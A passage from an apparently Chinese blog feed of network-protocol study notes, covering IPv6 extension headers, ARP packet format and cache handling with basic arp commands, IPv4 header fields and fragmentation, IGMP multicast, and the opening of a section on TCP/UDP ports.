style="color:blue;">当源节点发送的IPv6数据报比到达目的节点所经过路径上的最小MTU(PMTU)还要大时，需要对这个数据报进行分段</p></blockquote><p>IPv6协议通过分段扩展首部实现数据报的分段，只允许源节点对数据报进行分段，简化了中间节点对数据报的处理<br>前一个首部中的<code>下一个首部</code>的<strong>字段值为44</strong>。<br>需要进行分段的原始数据报在源节点被分为一系列分段数据报发送出去，每个分段数据报的大小应与传输路径上的最小MTU适应</p><blockquote><p>RFC2460中规定最小MTU值为1280字节</p></blockquote><img src="./IPv6协议结构/分段扩展首部.png"  /><blockquote><p style="color:blue;">对于IPv6固定首部和传输过程中必须由路由器处理的扩展首部如路由选择、逐跳选项扩展首部，不允许分段</p></blockquote><ul><li><p>可分段的部分包括:<strong>载荷、只能在到达最终目的地址时才处理的扩展首部</strong>。</p></li><li><p>将原始数据报中的可分段部分从左到右分成若干片，除最后一个分段外，每一片的长度是8个的整数倍。</p></li><li><p><strong>每个分段单独封装为一个IPv6数据报。</strong></p></li></ul><h5 id="身份认证扩展首部"><a href="#身份认证扩展首部" class="headerlink" title="身份认证扩展首部"></a>身份认证扩展首部</h5><blockquote><p style="color:orange;">为IPv6数据包和IPv6报头中那些经过IPv6网络传输后值不会改变的字段，提供了数据验证、数据完整性和反重放保护</p></blockquote><p>前一个首部中的<code>下一个首部</code>的<strong>字段值为51</strong></p><h5 id="封装安全有效载荷扩展首部"><a href="#封装安全有效载荷扩展首部" class="headerlink" title="封装安全有效载荷扩展首部"></a>封装安全有效载荷扩展首部</h5><ul><li>封装安全有效载荷（ESP）报头和尾部提供了数据机密性、数据验证性、数据完整性，以及对已封装有效载荷的重放保护服务。ESP报头并不为出现在它之前的IPv6报头或扩展报头提供安全服务</li><li>前一个首部中的<code>下一个首部</code>的<strong>字段值为50</strong></li></ul><h5 id="目的站选项扩展首部"><a href="#目的站选项扩展首部" class="headerlink" title="目的站选项扩展首部"></a>目的站选项扩展首部</h5><ul><li><strong>目的站选项扩展首部</strong>携带只需要目的站点检验的可选信息，IPv6目的地址字段所列的第一个目的主机，以及路由选择扩展首部所列的后续目的主机都要处理这个可选信息</li><li>前一个首部中的<code>下一个首部</code>的<strong>字段值为60</strong></li><li>以下两种方式使用目的选项头:<ul><li><strong>如果存在路由报头，则目的选项报头指定了在每个中间目标都要转发或处理的选项，此时目的选项头出现在路由报头之前</strong></li><li><strong>如果不存在路由报头，或者目的选项头出现在路由头之后，则目的选项报头中指定了在最终目标处要转发或处理的洗项</strong></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv4部分协议信息汇总</title>
      <link href="/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/"/>
      <url>/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a>地址解析协议 ARP</h2><p>[TOC]</p><h3 id="ARP的定义与基本功能"><a href="#ARP的定义与基本功能" class="headerlink" title="ARP的定义与基本功能"></a>ARP的定义与基本功能</h3><ul><li><p>掌握ARP协议的报文格式</p></li><li><p>掌握ARP协议的工作原理</p></li><li><p>理解ARP高速缓存的作用</p></li><li><p>掌握ARP缓存表的维护过程</p></li></ul><p><strong>ARP</strong>(Address Resolution Protocol，RFC 826）是根据IP地址获取物理地址的一个TCP/IP协议。主机通过将ARP请求<strong>广播</strong>到网络上的所有主机并接收返回消息来确定目标IP地址的物理地址，同时将IP地址和硬件地址存入本机ARP缓存中，下次请求时直接查询<strong>ARP缓存</strong>。</p><h4 id="物理地址："><a href="#物理地址：" class="headerlink" title="物理地址："></a>物理地址：</h4><p>物理地址通常是由硬件来实现的，例如以太网的物理地址被写入到网卡中，任何一块网卡的物理地址是唯一的</p><blockquote><p style="color:blue;">物理地址的长度和格式取决于具体的网络，以太网的物理地址是6字节地址物理地址可以是单播地址、多播地址或广播地址。</p></blockquote><h4 id="逻辑地址："><a href="#逻辑地址：" class="headerlink" title="逻辑地址："></a>逻辑地址：</h4><p>逻辑地址与物理设备本身没有关联, 逻辑地址可以是单播地址、多播地址和广播地址。</p><blockquote><p style="color:skyblue;">目前Internet上的IPv4协议逻辑地址是32位的IP地址， IPv6地址有128位长</blockquote><h4 id="地址解析"><a href="#地址解析" class="headerlink" title="地址解析:"></a>地址解析:</h4><p>逻辑地址是在网络层使用的，但数据包是在物理网络传递。主机或路由器是通过物理地址来识别的,因此将一个数据包传递到一个主机或路由器要进行寻址，需要将一个逻辑地址映射到相应的物理地址。</p><blockquote><p style="color:blue;">地址解析就是主机在发送帧前将目的逻辑地址转换成目的物理地址的过程。</p></blockquote><h5 id="静态映射"><a href="#静态映射" class="headerlink" title="静态映射:"></a>静态映射:</h5><p>手工创建IP地址与物理地址的映射关系，建立映射表。当已知IP地址时，通过查找映射表得到对应的物理地址。</p><blockquote><p style="color:orange;">局限性: 主机更换了网卡，也就改变了主机的物理地址。当主机从一个网络移到另一个网络时，物理地址没变，但IP地址改变了。·要适应这些变化，会增大维护静态映射表的开销。</p></blockquote><h5 id="用协议实现地址映射："><a href="#用协议实现地址映射：" class="headerlink" title="用协议实现地址映射："></a>用协议实现地址映射：</h5><p>在使用TCP/IP协议的以太网中，<strong>ARP</strong>(Address Resolution Protocol)协议完成将IP地址映射到MAC地址的过程，逆地址解析协议<strong>RARP</strong>(Reverse Address Resolution Protocol)将物理地址映射为IP地址</p><h3 id="ARP的报文格式："><a href="#ARP的报文格式：" class="headerlink" title="ARP的报文格式："></a>ARP的报文格式：</h3><img src="./网际协议IP/ARP的报文格式.png"  /><p style="color:blue; text-indent: 112px;">硬件类型:16bit，定义运行ARP的网络类型，如以太网的硬件类型是1。</p><p style="color:blue; text-indent: 112px;">协议类型:16bit，定义使用ARP的高层协议，如对于IPv4协议，该字段的值是Ox0800。</p><p style="color:blue; text-indent: 112px;">硬件长度:8bit，以字节为单位的物理地址长度，如以太网硬件地址长度为6。</p><p style="color:blue; text-indent: 112px;">协议长度:8bit，以字节为单位的逻辑地址的长度，对于IPv4，该字段为4。<p><p style="color:blue; text-indent: 112px;">操作码:16bit,1表示ARP请求，2表示ARP应答。</p><p style="color:blue; text-indent: 112px;">发送端硬件地址:变长字段，对于以太网该字段长度是6字节</p><p style="color:blue; text-indent: 112px;">发送端逻辑地址:变长字段，对于IPv4地址，该字段长度为4字节。</p><p style="color:rgb(255, 118, 0); text-indent: 112px;">目的端硬件地址:变长字段，对于ARP请求报文，该字段全为0</p><p style="color:blue; text-indent: 112px;">目的端逻辑地址:变长字段，定义目标逻辑地址。</p><p style="color:black;">ARP数据报直接封装在数据链路层的帧中</p><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/ARP封装.png" style="zoom:80%;" /></center><h3 id="ARP的运行过程："><a href="#ARP的运行过程：" class="headerlink" title="ARP的运行过程："></a>ARP的运行过程：</h3><h4 id="数据包传输步骤"><a href="#数据包传输步骤" class="headerlink" title="数据包传输步骤"></a>数据包传输步骤</h4><blockquote><ul><li>发送端知道目的端的IP地址。</li><li>IP要求ARP创建一个ARP请求报文，其中包含了发送方的物理地址、发送方的IP地址和目的端的IP地址。目的端的物理地址用0填充</li><li>将报文传递到数据链路层，并在该层中用<strong>发送方的物理地址作为源地址</strong>，<strong>用物理广播地址作为目的地址</strong>，将其封装在一个帧中。</li><li>因为该帧中包含了一个<strong>广播</strong>目的地址，所以同一链路中的每个主机或路由器都接收到这个帧。所有接收到该帧的主机都将其传递到ARP层进行处理。<strong>除了目的端主机以外的所有主机都丢弃该报文</strong>。</li><li>目的主机用一个包含其物理地址的ARP应答报文<strong>单播</strong>做响应。</li><li>发送方接收到这个应答报文，这样它就知道了目标主机的物理地址。</li><li>将IP数据报封装在一个帧中，并单播到目的地址。</li></ul></blockquote><h3 id="ARP高速缓存："><a href="#ARP高速缓存：" class="headerlink" title="ARP高速缓存："></a>ARP高速缓存：</h3><p>当主机A通过ARP请求得到B的物理地址后就将“IP地址—MAC地址”的绑定信息存储在<strong>高速缓存</strong>中。对于后续发往E的分组，可以通过缓存得到物理地址<br>当ARP被询问一个已知IP地址节点的MAC地址时，先在ARP缓存表查看，若存在，就直接返回MAC地址，若不存在，才发送ARP请求向局域网查询。</p><h4 id="缓存表内容："><a href="#缓存表内容：" class="headerlink" title="缓存表内容："></a>缓存表内容：</h4><p>静态项目一直保留在缓存中，直到重新启动计算机为止。</p><p>动态项目随时间推移自动添加和删除，每个动态ARP缓存项的潜在生命周期是10分钟。<br>新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除;<br>如果某个项目已在使用，则又收到2分钟的生命周期;<br>如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h4 id="arp命令的用法"><a href="#arp命令的用法" class="headerlink" title="arp命令的用法:"></a>arp命令的用法:</h4><p>arp命令用于对本地arp缓存进行操作，不会发送ARP请求</p><blockquote><ul><li>arp -a:              列出ARP缓存中的所有条目</li><li>arp -a ip:          列出缓存中与ip对应的条目</li><li>arp -d:              清空arp缓存</li><li>arp -d ip:          删除缓存中与ip对应的条目</li><li>arp -s ip mac : 在arp缓存中添加一个静态arp条目</li></ul></blockquote><h2 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a>网际协议IP</h2><h3 id="IP协议简介（lP-Internet-Protocol）"><a href="#IP协议简介（lP-Internet-Protocol）" class="headerlink" title="IP协议简介（lP- Internet Protocol）"></a>IP协议简介（lP- Internet Protocol）</h3><ul><li>网际协议IP是TCP/IP最核心的协议，也是最重要的因特网标准协议之一</li><li>IP负责将数据包从源点交付到终点，所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输。</li></ul><h4 id="IP的特性："><a href="#IP的特性：" class="headerlink" title="IP的特性："></a>IP的特性：</h4><blockquote><p style="color:blue;">不可靠:不保证分组成功地送到目的站。任何可靠性的要求必须由上层协议实现。</p></blockquote><blockquote><p style="color:orange;">无连接:IP并不维护任何后续分组的状态信息，每个分组都是相互独立的</p></blockquote><blockquote><p style="color:red;">尽最大努力交付:IP协议尽力发送每个分组，只有当资源用完或网络出现故障时才会发送失败</p></blockquote><h4 id="IP地址及表示方法："><a href="#IP地址及表示方法：" class="headerlink" title="IP地址及表示方法："></a>IP地址及表示方法：</h4><p>IP地址：一个IP地址惟一地标识了Internet上的一台主机，IPv4协议使用32位地址，这表示地址空间是2^32。而IPv6协议使用128位地址，地址空间为2^128。<br>表示方法：点分十进制表示:每个字节用一个十进制数表示。</p><img src="./网际协议IP/IP地址分类.png"/><h5 id="网络号："><a href="#网络号：" class="headerlink" title="网络号："></a>网络号：</h5><p>D类地址和E类地址不划分网络号和主机号。</p><img src="./网际协议IP/网络号.png" style="zoom:67%;" /><h5 id="特殊的IP地址："><a href="#特殊的IP地址：" class="headerlink" title="特殊的IP地址："></a>特殊的IP地址：</h5><blockquote><p style="color:blue;">网络地址:主机号全0的IP地址，不分配给任何主机，作为网络本身的标识</p></blockquote><blockquote><p style="color:orange;">广播地址:主机号为全1的IP地址，用作广播地址，目的地址为广播地址的数据包传递给该网络中的所有节点</p></blockquote><blockquote><p style="color:skyblue;">有限广播地址:32位为全“1”的IP地址(255.255.255.255)，通常由无盘工作站启动时使用，希望从网络IP地址服务器处获得一个IP地址</p></blockquote><blockquote><p style="color:red;">主机本身地址:32位全“0”的IP地址(0.0.0.0)称为主机本身地址</p>- 当一个主机要获得其IP地址时，可以运行一个引导程序，并发送一个以全0为源地址、以全1为目的地址的分组给引导服务器，以获得本主机的IP地址。</blockquote><blockquote><p style="color:black;">环回地址:27.0.0.1称为回环地址，可用来测试TCP/IP协议是否正常工作，常用于本机上软件测试和本机上网络应用程序之间的通信地址。</p>- 使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。</blockquote><h5 id="专用IP地址："><a href="#专用IP地址：" class="headerlink" title="专用IP地址："></a>专用IP地址：</h5><p>专用lIP地址:仅用于专用网内部的本地主机。<br>大多数路由器不转发携带专用IP地址的数据包，本地主机必须经网络地址转换服务器才能访问Internet。<br>专用IP地址范围: </p><img src="./网际协议IP/专用IP地址.png" style="zoom:67%;" /><h4 id="子网划分："><a href="#子网划分：" class="headerlink" title="子网划分："></a>子网划分：</h4><p><strong>Subnetting</strong><br>提高IP空间的利用率，增加IP分配的灵活性。<br>从主机号借用若干个比特作为子网号subnet-id，而主机号host-id也就相应减少若干个比特</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p><h4 id="子网掩码："><a href="#子网掩码：" class="headerlink" title="子网掩码："></a>子网掩码：</h4><blockquote><p style="color:blue;">子网掩码是一个网络号全1，主机号全0的32位二进制数，用于确定P中有多少位用于子网号。</p>- **~~表示方法~~**：点分十进制，IP地址后用`/`后面写明网络号的位数- 子网掩码与IP地址**按位做与**得到IP地址对应的**网络地址**</blockquote><h3 id="IP数据格式："><a href="#IP数据格式：" class="headerlink" title="IP数据格式："></a>IP数据格式：</h3><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png"></p><p>IP数据报由首部和数据两部分组成</p><h4 id="各字段的含义："><a href="#各字段的含义：" class="headerlink" title="各字段的含义："></a>各字段的含义：</h4><p>版本:4 bit，指IP协议的版本，目前的IP协议版本号为4(即IPv4)</p><p>首部长度:4 bit，以4字节为单位，因此IP的首部长度最大是60字节</p><p>服务类型: 8 bit，区分服务，一般不用。</p><p>总长度: 16 bit，首部和数据之和的长度，单位为字节，因此数据报的最大长度为65535字节。总长度不能超过网络的最大传输单元MTU。</p><p>标识:16 bit，数据报计数器</p><blockquote><p>IP软件在存储器中维持一个计数器，每产生一个数据报，计数器加1，并将此值赋给标识字段。<br>当数据报由于长度超过网络MTU而必须分片时，标识字段的值就被复制到所有的数据报分片的标识字段中。<br>相同的标识字段的值使分片后的各数据报片能正确重组成原来的数据报。</p></blockquote><p>标志: 3 bit，目前只有两位有意义</p><blockquote><ul><li>第一位保留。</li><li>中间一位记为DF，为不分片标志，只有当DF=0时才允许分片。</li><li>最后一位为MF，MF=1表示后面还有分片，MF=O表示这是最后一个数据报片。</li></ul></blockquote><p>偏移量:13 bit，较长的分组被分片后，某分片在原分组中的相对位置。片偏移以8个字节为单位。每个分片的长度必须是8的整数倍。</p><p>生存时间:8 bit，记为TTL (Time To Live)</p><blockquote><ul><li><p>表明数据报在网络中的寿命，其单位为秒。现在TTL的单位是跳数，指明数据报在因特网中至多可经过多少个路由器，最大值为255，通常为32、64、128。</p></li><li><p>当TTL值为1时，表示这个数据报只能在本局域网内传送，因为这个数据报传送到局域网上的某个路由器，在被转发之前TTL值就减小到0，因而会被路由器丢弃。</p></li></ul></blockquote><p>协议: 8 bit，指出此数据报携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给对应的进程处理。</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E9%AB%98%E5%B1%82%E5%8D%8F%E8%AE%AE.png"></p><p>首部检验和:16 bit，检验数据报的首部，不包括数据部分。采用简单的16位反码求和的计算方法。</p><p>源IP地址: 32bit，定义了源主机的IP地址。在IP数据包从源主机传送到目的主机期间，该字段保持不变。</p><p>目的IP地址: 32bit，定义了目的主机的IP地址。在IP数据报从源主机传送到目的主机期间，该字段保持不变。</p><h3 id="IP数据报分片："><a href="#IP数据报分片：" class="headerlink" title="IP数据报分片："></a>IP数据报分片：</h3><p>数据包可能经过多个不同的网络，每一个路由器把收到的帧进行拆装，处理后又封装成另一个帧。<br>收到帧的格式与长度取决于这个帧刚经过的物理网络所使用的协发<br>送出去的帧的格式与长度取决于这个帧将要经过的物理网络所使用的协议。</p><p><strong>最大传输单元MTU</strong>：不同网络所能传送的数据包的最大长度是不同的，这个最大长度叫做最大传输单元MTU ( Maximum Transmission Unit ) </p><blockquote><p style="color:orange;">MTU即该网络的数据链路层帧的数据部分的最大长度。</p></blockquote><h4 id="分片："><a href="#分片：" class="headerlink" title="分片："></a>分片：</h4><blockquote><ul><li><p>对于物理网络，如果数据包的长度超过了MTU，就要把数据部分进行分片。</p></li><li><p>每个分片都有自己的首部。</p></li><li><p>如果已经分片的数据包要经过更小MTU的网络，那么这些已经分片的数据包还可再进行分片，数据包在到达最后终点之前可以经过多次的分片。</p></li><li><p style="color:red;">数据包可以被源主机或在其路径上的路由器进行分片，但是数据包的重装只能在目的主机上进行。</p></li></ul></blockquote><h4 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h4><h5 id="目的主机进行分片重组"><a href="#目的主机进行分片重组" class="headerlink" title="目的主机进行分片重组"></a>目的主机进行分片重组</h5><blockquote><p style="color:blue;">IP规定，数据报分片的重组地点是目的主机，中间路由器不对任何被分片的数据报进行重组，即使其转发接口的MTU非常大。</p></blockquote><blockquote><p>优点:<br>简化了路由软件的操作，提高了路由器的处理效率。<br>可以避免重复分片。在数据报投递过程中，途经网络的MTU是不可预知的</p></blockquote><blockquote><p>缺点<br>浪费带宽。因为每个分片都要有一个首部，分片越多，首部开销越大。<br>增加了数据包丢失的可能性。分片越多，丢失的可能性越大。一旦丢失了一个分片，整个数据报就必须重新传输。</p></blockquote><h5 id="分片重组："><a href="#分片重组：" class="headerlink" title="分片重组："></a>分片重组：</h5><p>有关的三个字段是:标识字段、标志字段和偏移量字段。</p><p>当目的主机收到一个数据报时，可以根据偏移量和MF位判断:</p><ul><li>片偏移不为0，表明它是一个分片;</li><li>如果片偏移为0，且MF位为1，表明它是第一个分片;</li><li>如果片偏移为0，且MF位为0，则表明它是一个完整的数据报。</li></ul><p>根据数据报首部“标识”字段的值，可判断哪些分片属于同一个原始数据报片偏移用来确定分片在原始数据报中的位置。</p><h5 id="重组定时器："><a href="#重组定时器：" class="headerlink" title="重组定时器："></a>重组定时器：</h5><p>为防止因等待一个丢失的分片而无限期延长重组过程，在重组分片时启动一个定时器,如果超时后仍然没有收到一个数据报的全部分片，则该数据报被丢弃。<br>IP数据报校验和：</p><blockquote><p style="color:blue;">校验和：数据包上的附加信息，能够识别数据包在传输过程中是否出错。</p></blockquote><p>发送端先计算校验和，并把得到的结果与数据包一起发送出去。接收端对数据包进行同样的计算。若结果正确，则接受这个数据包，否则就丢弃它。</p><h4 id="校验和的计算："><a href="#校验和的计算：" class="headerlink" title="校验和的计算："></a>校验和的计算：</h4><p>发送端：将数据包按16位分段。把这些段用反码算术运算相加，将相加后得到的和再取反码就得出了校验和。<br>接收端：把收到的数据包按16位分段，并把这些段相加。得到的和取反码。若结果为0，则接受这个数据包，否则拒绝这个数据包。</p><img src="./网际协议IP/校验计算.png" style="zoom: 50%;" /><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><blockquote><blockquote><p style="color:blue;">IP数据包的校验和只校验IP首部部分而不校验IP数据部分。</p></blockquote><ul><li>首先，所有将数据封装在IP数据报中的高层协议，都有覆盖整个数据包的校验和。因此，IP数据报的校验和就不必再检验所封装的数据部分。</li><li>其次，每经过一个路由器，IP数据包的首部就要改变一次，但数据部分不改变。因此若校验和包含数据部分，这就意味着路由器要花费很多时间计算没有改变的数据部分的校验和。</li></ul></blockquote><h2 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a>Internet组管理协议IGMP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握IGMP协议的报文格式</span><span class="token comment"># 掌握IGMP协议的工作原理</span><span class="token comment"># 理解多播组地址到以太网地址的映射</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="单播与多播与广播"><a href="#单播与多播与广播" class="headerlink" title="单播与多播与广播:"></a>单播与多播与广播:</h3><blockquote><p style="color:red;">单播(unicast):    单个源站与单个目的站之间的通信叫作单播，IP数据报中的源IP地址和目的IP地址分别代表了源站和目的站。</p></blockquote><blockquote><p style="color:blue;">绝大多数的网络应用程序是单播</p></blockquote><blockquote><p style="color:red;">多播/组播(multicast): 一个源站和多个目的站之间的通信叫作多播。</p></blockquote><blockquote><ul><li>IP数据报中的源地址是单播地址，目的地址是组地址(D类地址)</li><li>路由器收到组播数据包后，可从它的多个接口转发出去<br>目前，组播机制没有被广泛支持，主要的组播路由机制有距离向量多播路由协议(DVMRP)和协议无关组播(PIM) .</li></ul></blockquote><blockquote><p style="color:red;">广播(broadcast):广播源站和目的站是一对多的，源站只有一个，但所有其它主机都是目的站Internet不支持广播，因为这会产生非常大的通信量</p></blockquote><h4 id="组播"><a href="#组播" class="headerlink" title="组播:"></a>组播:</h4><p>优点：采用组播技术后，即使用户数量成倍增长，主干网带宽不需要随之增加。从而解决了宽带应用对带宽和服务质量的要求问题</p><img src="./网际协议IP/组播示意.png" style="zoom: 33%;" /><p>组播比多个单播具有更小的分组时延</p><h5 id="组播地址范围："><a href="#组播地址范围：" class="headerlink" title="组播地址范围："></a>组播地址范围：</h5><blockquote><ol><li>IANA(国际因特网地址分配委员会）把D类地址空间用于IP组播地址</li><li>IP组播地址的范围是:224.0.0.0~239.255.255.255</li><li>常用的组播地址<ul><li>224.0.0.1        在本子网上的所有参加多播的主机和路由器</li><li>224.0.0.2        在本子网上的所有参加多播的路由器</li><li>224.0.0.5        用来给一个网段中所有的OSPF路由器发送OSPF路由信息</li><li>224.0.0.9        RIPv2组地址</li><li>224.0.0.11      供DHCP服务器和中继代理使用</li></ul></li></ol></blockquote><h5 id="动态的组成员"><a href="#动态的组成员" class="headerlink" title="动态的组成员"></a>动态的组成员</h5><blockquote><p style="color:orange;">多播组中的成员是动态的。一个进程可请求其主机参加某个特定组，或在任意时间退出该组</p></blockquote><h5 id="使用硬件进行多播"><a href="#使用硬件进行多播" class="headerlink" title="使用硬件进行多播"></a>使用硬件进行多播</h5><blockquote><p style="color:orange;">当数据报传送到以太网时，以太网利用硬件进行多播，交付给属于该组成员的主机</p></blockquote><h4 id="多播组地址到以太网地址的转换"><a href="#多播组地址到以太网地址的转换" class="headerlink" title="多播组地址到以太网地址的转换"></a>多播组地址到以太网地址的转换</h4><p>多播以太网地址的前25位是0000000100000000010111100这意味着与IP多播相对应的以太网地址范围从01005E000000到01005E7FFFFF。然后将多播IP地址的低23位映射到以太网地址中的低23位。</p><img src="./网际协议IP/多播地址到以太网地址的转换.png" style="zoom: 50%;" /><p>由于D类地址的组标识字段长为28bit，将低23位复制到多播MAC地址中，有5bit未使用，所以<strong>映射是多对一的</strong>。</p><p><strong>32个多播IP地址映射到一个以太网多播地址</strong>。既然地址映射不是惟一的，那么设备驱动程序或lP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能,设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</p><h3 id="IGMP协议简介："><a href="#IGMP协议简介：" class="headerlink" title="IGMP协议简介："></a>IGMP协议简介：</h3><p>IGMP ( lnternet Group Management Protocol)协议，IGMP位于网络层。</p><p style="color:orange;">IGMP协议运行于主机和主机直接相连的路由器之间，是IP主机用来报告多播组成员身份的协议</p>利用IGMP协议，一方面可以使主机通知本地路由器希望加入并接收某个特定多播组的信息;另一方面，路由器可以周期性地查询局域网内某个已知组的成员是否处于活动状态。IGMP使用预留的组播地址224.0.0.1与本地路由器通信。<h3 id="IGMP报文格式："><a href="#IGMP报文格式：" class="headerlink" title="IGMP报文格式："></a>IGMP报文格式：</h3><p>IGMP协议目前有三个版本IGMP、IGMPv2和IGMPv3。</p><p>其中IGMPv2有3种报文类型:</p><blockquote><p>查询报文:路由器查询多播组中是否有活跃成员，分为一般查询和特定查询</p><p>成员关系报告报文:加入多播组或响应查询报文。</p><p>退出报告报文:离开多播组。</p></blockquote><h4 id="IGMPv2报文格式："><a href="#IGMPv2报文格式：" class="headerlink" title="IGMPv2报文格式："></a>IGMPv2报文格式：</h4><img src="./网际协议IP/IGMPv2报文格式.png" style="zoom:67%;" /><ol><li><p>类型:定义了IGMP报文类型</p><img src="./网际协议IP/IGMP报文类型.png" style="zoom: 80%;" /></li><li><p>响应时间:规定查询必须在多长时间内回答，以十分之一秒为单位。默认值为10秒。在查询报文中，这个值不为0，在其它报文中此字段值为0</p></li><li><p>检验和:对整个IGMP报文进行检验，算法同IP数据报</p></li><li><p>组地址:在一般查询报文中值为0。在特殊的查询报文、成员关系报告报文以及退出报文中值为相应的多播组地址</p></li></ol><h4 id="IGMP的封装"><a href="#IGMP的封装" class="headerlink" title="IGMP的封装"></a>IGMP的封装</h4><p>IGMP报文被封装在IP数据报中，IP层有3个字段需要注意:</p><blockquote><ul><li>协议类型:值为2，高层协议类型为2的IP数据包，其数据部分要交给IGMP协议处理。</li><li>生存时间:值为1，保证了这个报文不离开这个局域网。因为IGMP的作用范围是局域网，IGMP报文不能够发送到局域网以外的地方。</li><li>目的IP地址:为D类组播地址。</li></ul></blockquote><h3 id="多播组成员的加入和退出："><a href="#多播组成员的加入和退出：" class="headerlink" title="多播组成员的加入和退出："></a>多播组成员的加入和退出：</h3><h4 id="加入一个组"><a href="#加入一个组" class="headerlink" title="加入一个组"></a>加入一个组</h4><p>每个主机维护一张成员关系表，成员关系表是**&lt;进程名，组名&gt;<strong>表项的集合。当一个进程P要加入一个新组MG时，就向主机发出申请，主机就在成员关系表中增加</strong>&lt;P, MG&gt;**表项。</p><blockquote><ul><li>如果MG在表中不存在，主机就发送成员关系报告报文</li><li>如果MG在表中已经存在，那就不必发送成员关系报告报文，因为主机已经是MG这个组的成员了</li></ul></blockquote><img src="./网际协议IP/加入多播组.png" style="zoom:67%;" /><p>路由器也维护一个多播地址表，给出了连接到每一个接口的成员关系。如果对于这些接口中的一个组有兴趣时，路由器就发送成员关系报告报文，以记录连接在它的接口上的所有的多播组。<br>IGMP协议要求把成员关系报告报文在很短的时间内发送两次。这样，如果第一个报文丢失或受到损伤，那么第二个报文可以代替它。</p><h4 id="退出一个组"><a href="#退出一个组" class="headerlink" title="退出一个组"></a>退出一个组</h4><ol><li><p>当主机发现在一个群组MG中已经没有进程时，就发送退出报告报文，多播路由器收到该报告。当路由器发现在一个特定组中已经没有连接在它的接口上感兴趣的网络，它就发送退出这个组的报告。</p></li><li><p>多播路由器收到退出报告报文时，并不立即删除这个群组MG，而是发送针对MG的查询报文，因为这个退出群组报告仅仅是从一个站点发送来的，可能还有其他站点仍然需要这个群组。</p></li><li><p>若在指定时间内没有收到站点对该群组的成员关系报告，就意味着在本网络上没有这个群组MG的成员，删除这个群组。</p><img src="./网际协议IP/退出多播组.png" style="zoom:67%;" /></li></ol><h4 id="监视组成员关系"><a href="#监视组成员关系" class="headerlink" title="监视组成员关系"></a>监视组成员关系</h4><blockquote><ul><li>当仅有一台主机留在一个组中时，如果这台主机离开了这个组而没有发送退出报告报文，那么多播路由器将永远收不到退出报告报文，它认为这个组一直存在这个成员。</li></ul></blockquote><p>多播路由器负责监视局域网上的所有主机或路由器,多播路由器周期性地发送<strong>一般查询报文</strong>，在这个报文中，组地址被置为<strong>0.0.0.0</strong>。</p><p>路由器期望着在它的组表中的每一个组的回答，甚至新的组也可以回答。查询报文的最大响应时间是10秒。当主机路由器收到一般查询报文时，如果它对一个组感兴趣，就发送成员关系报告报文。</p><h4 id="延迟响应"><a href="#延迟响应" class="headerlink" title="延迟响应"></a>延迟响应</h4><blockquote><p style="color:blue;">IGMP使用延迟响应策略，避免不必要的通信量。当主机或路由器收到查询报文时，它不是立即响应，而是延迟响应</p></blockquote><p>主机或路由器使用一个随机数产生计时器，它的截止时间是1～10秒。截止时间可以使用1秒或更短的步长。</p><p>表中的每一个组都设置计时器。每个主机或路由器在发送成员关系报告报文之前都要等待它的计时器到时。在这段等待时间中，如果在同一组中的其它主机或路由器的计时器先到了截止时间，那么这个主机或路由器就发送成员关系报告报文。因为这个报文是广播发送的，等待的主机或路由器都能收到这个报文，并知道没有必要对这个组发送重复的报文;因此，等待的主机或路由器就取消发送成员关系报告。</p><h2 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a>传输层协议TCP与UDP</h2><h3 id="进程间通信："><a href="#进程间通信：" class="headerlink" title="进程间通信："></a>进程间通信：</h3><blockquote><p style="color:orange;">点到点的通信:IP协议负责主机到主机的通信。作为网络层协议，IP协议只能把报文交付给目的主机。</p></blockquote><blockquote><p style="color:orange;">端到端的通信：运输层协议负责进程到进程的通信。TCP和UDP协议负责把报文交付到正确的进程。</p></blockquote><img src="./网际协议IP/进程间通信.png" style="zoom:80%;" /><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号:"></a>端口号:</h4><p>主机是用IP地址来标识的，而要标识主机中的进程，就需要使用端口号。TCP/IP协议族中，端口号占16 bit，用0~65535之间的整数标识。TCP和UDP是两个独立的软件模块，因此各自的端口号也相互独立。·端口号只具有本地意义，不同计算机的相同端口号是没有联系的。</p><h5 id="三类端口号："><a href="#三类端口号：" class="headerlink" 